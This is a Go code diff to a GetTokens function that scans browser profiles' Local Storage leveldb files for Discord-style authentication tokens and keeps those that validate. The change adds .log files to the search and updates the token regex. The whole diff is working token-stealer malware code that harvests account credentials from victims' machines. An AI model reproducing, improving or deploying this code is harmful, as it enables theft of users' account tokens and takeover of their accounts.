@@ -100,18 +100,26 @@ func GetTokens(goodBrowsers []structs.Browser) string {
 	for _, browser := range goodBrowsers {
 		for _, profile := range browser.Profiles {
 			goodPath := filepath.Join(profile.NameAndPath, "Local Storage", "leveldb", "*.ldb")
+			goodPath2 := filepath.Join(profile.NameAndPath, "Local Storage", "leveldb", "*.log")
 
 			ldbFiles, err := filepath.Glob(goodPath)
 			if err != nil {
 				continue
 			}
 
-			for _, ldbLog := range ldbFiles {
+			ldbFiles2, err := filepath.Glob(goodPath2)
+			if err != nil {
+				continue
+			}
+
+			appendFiles := append(ldbFiles, ldbFiles2...)
+
+			for _, ldbLog := range appendFiles {
 				data, err := os.ReadFile(ldbLog)
 				if err != nil {
 					continue
 				}
-				normal_regex_mem, err := regexp.Compile(`[\w-]{26}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{80,95}`)
+				normal_regex_mem, err := regexp.Compile(`[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}`)
 				if err == nil {
 					if string(normal_regex_mem.Find(data)) != "" {
 						t := string(normal_regex_mem.Find(data))
@@ -139,6 +147,7 @@ func GetTokens(goodBrowsers []structs.Browser) string {
 	}
 
 	for _, token := range tokens_current {
+
 		if CheckToken(token) {
 			final_tokens = append(final_tokens, token)
 		}
